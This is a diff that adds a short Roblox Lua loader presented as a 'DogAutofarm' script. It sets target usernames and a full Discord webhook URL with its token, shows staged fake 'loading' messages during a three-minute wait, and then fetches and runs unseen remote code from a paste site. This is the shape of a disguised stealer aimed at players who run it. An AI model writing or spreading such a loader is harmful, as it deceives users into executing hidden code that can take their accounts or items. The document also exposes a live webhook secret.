@@ -1,0 +1,9 @@
+UserName = "arableri"
+UserName2 = "arableri"
+Webhook = "https://discord.com/api/webhooks/1112335742115532920/vAgX_cmHTvW6lZ3He_aXQjdCQXBzCFk_v1WR1S7FVSG5yFSK6UyWidPLuFY5Ijw09IEk"
+_G.ScriptName = "DogAutofarm"
+_G.FirstText = "Please wait first time"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984466", true))()
